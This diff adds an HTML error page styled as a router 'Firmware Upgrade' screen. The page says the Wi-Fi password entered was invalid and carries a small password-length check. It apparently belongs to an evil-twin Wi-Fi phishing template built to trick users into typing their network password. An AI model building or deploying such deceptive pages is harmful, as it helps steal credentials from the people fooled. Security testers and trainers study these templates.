@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Router Configuration Page</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel=stylesheet href=css/main.css>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <!-- CSS -->
+  </head>
+
+  <body id="guest-login">
+    <!-- To change the navigation bar color change background attribute -->
+    <div id="logoDivWhite"></div>
+
+    <div id="dialog">
+      <div id="header">
+        <h1>Firmware Upgrade</h1>
+        <br />
+        <div class="alert alert-danger">Oops Invalid Wifi password</div>
+        <p>
+          Password you entered does not match network password. Please go
+          <a href="javascript:window.history.back()">back</a> and enter the correct password
+        </p>
+      </div>
+    </div>
+    <script>
+      /*
+        Check the password field and act accordingly.
+      */
+      $("#submit-login").on("click", function(e) {
+        // get the password box and checkbox elements
+        var input = document.getElementById("pwd");
+        if (input.value.length < 7 || input.value.length > 64) {
+          // display no password message
+          alert("Please enter a password between 7 and 64 characters");
+          return false;
+        }
+      });
+    </script>
+  </body>
+</html>
